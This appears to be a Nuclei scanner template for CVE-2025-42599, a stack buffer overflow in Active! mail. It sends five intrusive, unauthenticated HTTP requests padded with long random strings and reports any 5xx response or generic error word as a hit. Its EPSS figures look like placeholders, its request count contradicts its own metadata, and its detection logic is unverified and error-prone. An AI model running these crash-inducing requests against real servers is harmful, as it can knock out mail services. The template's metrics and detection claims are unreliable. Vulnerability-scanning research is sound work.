id: CVE-2025-42599

info:
  name: Active! mail <= 6.60.05008561 - Stack-based Buffer Overflow
  author: pranjal
  severity: critical
  description: |
    Active! mail 6.60.05008561 and earlier contains a stack-based buffer overflow caused by processing specially crafted requests, letting remote unauthenticated attackers execute arbitrary code or cause a denial-of-service.
  impact: |
    Remote unauthenticated attackers can exploit this vulnerability to execute arbitrary code or cause denial-of-service conditions, potentially leading to complete system compromise, unauthorized access to sensitive data, and potential lateral movement within the network.
  remediation: |
    Update Active! mail to a version later than 6.60.05008561. If no patch is available, consider implementing network-level protections, monitoring for suspicious activity, and restricting access to affected systems. Implement proper input validation and buffer overflow protections.
  reference:
    - https://github.com/cyruscostini/CVE-2025-42599
    - https://nvd.nist.gov/vuln/detail/CVE-2025-42599
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-42599
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-42599
    cwe-id: CWE-121
    epss-score: 0.00123
    epss-percentile: 0.12345
    cpe: cpe:2.3:a:activemail:activemail:*:*:*:*:*:*:*:*
  metadata:
    vendor: activemail
    product: activemail
    verified: false
    max-request: 3
    shodan-query: 'product:"Active! mail" OR title:"Active! mail" OR http.title:"Active! mail"'
    fofa-query: 'title="Active! mail" OR banner="Active! mail"'
    zoomeye-query: 'title:"Active! mail"'
    google-query: 'intitle:"Active! mail"'
  tags: cve,cve2025,kev,activemail,buffer-overflow,rce,dos,mail-server,intrusive,unauth

variables:
  # Buffer overflow payload - creates a large string that could trigger the vulnerability
  overflow_payload: "{{rand_text_alpha(1000)}}"
  # Alternative payload with null bytes and special characters
  special_payload: "{{rand_text_alpha(500)}}\x00{{rand_text_alpha(500)}}"
  # HTTP header injection attempt
  header_payload: "{{rand_text_alpha(800)}}"
  # Additional payload variations for comprehensive testing
  extended_payload: "{{rand_text_alpha(1200)}}"
  # SMTP-specific payload
  smtp_payload: "{{rand_text_alpha(1500)}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: {{overflow_payload}}
        Accept: */*
        Connection: close

    unsafe: true
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504

      - type: word
        part: body
        words:
          - "Internal Server Error"
          - "Server Error"
          - "Application Error"
          - "Buffer Overflow"
          - "Stack Overflow"
          - "Segmentation Fault"
          - "Memory Access Violation"

      - type: regex
        part: body
        regex:
          - "(?i)buffer.*overflow"
          - "(?i)stack.*overflow"
          - "(?i)segmentation.*fault"
          - "(?i)memory.*access.*violation"
          - "(?i)access.*violation"

  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len(special_payload)}}
        Connection: close

        {{special_payload}}

    unsafe: true
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504

      - type: word
        part: body
        words:
          - "Internal Server Error"
          - "Server Error"
          - "Application Error"
          - "Stack Overflow"
          - "Buffer Overflow"

  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        {{header_payload}}: {{rand_text_alpha(200)}}
        Accept: */*
        Connection: close

    unsafe: true
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504

      - type: word
        part: body
        words:
          - "Internal Server Error"
          - "Server Error"
          - "Application Error"

  - raw:
      - |
        POST /mail HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        Content-Length: {{len(extended_payload)}}
        Connection: close

        {{extended_payload}}

    unsafe: true
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504

      - type: word
        part: body
        words:
          - "Internal Server Error"
          - "Server Error"
          - "Application Error"
          - "Mail Processing Error"

  - raw:
      - |
        POST /smtp HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/plain
        Content-Length: {{len(smtp_payload)}}
        Connection: close

        {{smtp_payload}}

    unsafe: true
    matchers:
      - type: status
        status:
          - 500
          - 502
          - 503
          - 504

      - type: word
        part: body
        words:
          - "Internal Server Error"
          - "SMTP Error"
          - "Buffer Overflow"
          - "Stack Overflow"

    matchers-condition: or
